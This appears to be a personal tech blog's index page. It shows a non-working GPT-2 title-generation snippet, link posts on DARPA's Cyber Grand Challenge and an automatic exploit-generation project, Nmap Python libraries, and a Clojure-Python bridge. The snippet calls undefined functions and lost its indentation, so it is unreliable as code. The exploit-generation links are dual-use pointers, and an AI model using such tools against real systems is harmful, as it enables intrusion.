-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> transformers <span class="keyword">import</span> AutoTokenizer, AutoModelForCausalLM</span><br><span class="line"><span class="comment"># Load the keywords you want to use to generate the title</span></span><br><span class="line">keywords = [<span class="string">&quot;quick&quot;</span>, <span class="string">&quot;brown&quot;</span>, <span class="string">&quot;fox&quot;</span>]</span><br><span class="line"><span class="comment"># Tokenize the keywords using a pre-trained language model</span></span><br><span class="line">tokenizer = AutoTokenizer.from_pretrained(<span class="string">&quot;gpt2&quot;</span>)</span><br><span class="line">tokens = tokenizer.encode(keywords)</span><br><span class="line"><span class="comment"># Load a pre-trained language model</span></span><br><span class="line">language_model = AutoModelForCausalLM.from_pretrained(<span class="string">&quot;gpt2&quot;</span>)</span><br><span class="line"><span class="comment"># Generate candidate titles from the keywords</span></span><br><span class="line">candidate_titles = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">title = language_model.generate(tokens, max_length=<span class="number">8</span>)</span><br><span class="line">title = tokenizer.decode(title[<span class="number">0</span>])</span><br><span class="line">candidate_titles.append(title)</span><br><span class="line"><span class="comment"># Select the most catchy and relevant title</span></span><br><span class="line">selected_title = candidate_titles[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> title <span class="keyword">in</span> candidate_titles:</span><br><span class="line"><span class="keyword">if</span> is_catchy(title) <span class="keyword">and</span> is_relevant(title, keywords):</span><br><span class="line">selected_title = title</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(selected_title)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>This example generates three candidate titles from a set of keywords using a pre-trained language model, and then selects the most catchy and relevant title as the final title. Of course, this is just a simple example to illustrate the basic concept of using a language model to generate a catchy title from keywords. In practice, you would need to use a much larger corpus of text to train the language model and generate more accurate and diverse titles.</p>
-
-	
-	</div>
-  <a type="button" href="/blog/2022/12/08/a60440bd-9482-44c5-9844-d747da208f69/#more" class="btn btn-default more">Read More</a>
-</div>
-
-	       
-		     
-	
-	<!-- display as entry -->	
-		<h3 class="title">
-			<div class="date"> 2022-12-07 </div>
-			<div class="article-title"><a href="/blog/2022/12/07/c500a693-b2ba-4f2c-a898-c751b801b650/" title="The DARPA competition utilizes machine learning to generate software exploits in assembly and Python using Neural Machine Translation for natural language descriptions. This includes modifying Java bytecode and filtering HTML requests.">Cyber Grand Challenge Darpa Machine Automated Cyber Attack</a></div>
-		</h3>
-	
-
-
-		     
-<div class="entry">
-
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/introduction/cgc/">ctfwiki’s intro on CGC</a></p>
-<p>analyze source code first, then plan attack or fix code</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/CyberGrandChallenge">cgc’s github repo</a> and <a target="_blank" rel="noopener" href="http://cybergrandchallenge.com/">website</a></p>
-<p>search for <code>darpa cgc</code> on github</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/jamespic/cyber-challenge">cyber-challenge</a> Some toy examples, to demonstrate ideas that could be used in DARPA’s Cyber Grand Challenge including modifying java bytecode and filter out html requests on the fly</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/dessertlab/EVIL">EVIL</a> (Exploiting software VIa natural Language) is an approach to automatically generate software exploits in assembly&#x2F;Python language from descriptions in natural language. The approach leverages Neural Machine Translation (NMT) techniques and a dataset that we developed for this work.</p>
-<p>Topics</p>
-<p>linux exploit encoder assembly decoder dataset seq2seq shellcode nmt software-exploitation codebert</p>
-<p>Resources</p>
-<p>Readme</p>
-<p>License</p>
-<p>GPL-3.0 license</p>
-<p>Stars</p>
-<p>13 stars</p>
-<p>Watchers</p>
-<p>3 watching</p>
-<p>Forks</p>
-<p>1 fork</p>
-<p>Releases</p>
-<p>No releases published</p>
-<p>Packages</p>
-<p>No packages published</p>
-<p>Contributors 2</p>
-<p>@piliguori</p>
-<p>piliguori Pietro Liguori</p>
-<p>@taisazero</p>
-<p>taisazero Erfan Al-Hossami</p>
-<p>Languages</p>
-<p>Python</p>
-<p>97.6%</p>
-<p>Shell</p>
-<p>2.0%</p>
-<p>Other</p>
-<p>0.4%</p>
-
-	
-	</div>
-  <a type="button" href="/blog/2022/12/07/c500a693-b2ba-4f2c-a898-c751b801b650/#more" class="btn btn-default more">Read More</a>
-</div>
-
-	       
-		     
-	
-	<!-- display as entry -->	
-		<h3 class="title">
-			<div class="date"> 2022-12-02 </div>
-			<div class="article-title"><a href="/blog/2022/12/02/cc1e47b5-db3d-41e0-a6b3-a489fb104747/" title="This article provides an overview of several Python libraries and resources available for working with the Nmap network scanning tool. It covers python3-nmap, nmapthon, and python-nmap, along with their respective documentation, allowing readers to choose the best option for their needs.">Exploring Python Libraries And Resources For Nmap Network Scanning</a></div>
-		</h3>
-	
-
-
-		     
-<div class="entry">
-
-  <div class="row">
-	
-	
-		<h1 id="nmap-python-scripting"><a href="#nmap-python-scripting" class="headerlink" title="nmap python scripting"></a>nmap python scripting</h1><p><a target="_blank" rel="noopener" href="https://pypi.org/project/python3-nmap/">python3-nmap</a> and <a target="_blank" rel="noopener" href="https://nmap.readthedocs.io/en/latest/nmap.html">doc</a></p>
-<p><a target="_blank" rel="noopener" href="https://nmapthon.readthedocs.io/en/latest/simple_information.html">doc of nmapthon</a> python scriptable nse</p>
-<p><a target="_blank" rel="noopener" href="https://pypi.org/project/python-nmap/">python-nmap</a></p>
-
-	
-	</div>
-  <a type="button" href="/blog/2022/12/02/cc1e47b5-db3d-41e0-a6b3-a489fb104747/#more" class="btn btn-default more">Read More</a>
-</div>
-
-	       
-		     
-	
-	<!-- display as entry -->	
-		<h3 class="title">
-			<div class="date"> 2022-11-11 </div>
-			<div class="article-title"><a href="/blog/2022/11/11/fc18f6ac-1fc3-4573-b435-c59310b8ecd3/" title="This article explores the integration between Python and Clojure using the libpython-clj library. The author explains how to call Python functions from Clojure or embed Clojure code within Python, making it easier to leverage the strengths of both languages in a single project.">Call Python In Clojure, Clojure-Python Bridge</a></div>
-		</h3>
-	
-
-
-		     
-<div class="entry">
-
-  <div class="row">
-	
-	
-		<p><a target="_blank" rel="noopener" href="https://github.com/clj-python/libpython-clj">libpython-clj</a> deep python integration in clojure</p>
-<p><a target="_blank" rel="noopener" href="https://clj-python.github.io/libpython-clj/embedded.html">embed clojure in python</a> call clojure in python</p>
-
-	
-	</div>
-  <a type="button" href="/blog/2022/11/11/fc18f6ac-1fc3-4573-b435-c59310b8ecd3/#more" class="btn btn-default more">Read More</a>
 </div>
 
 	       
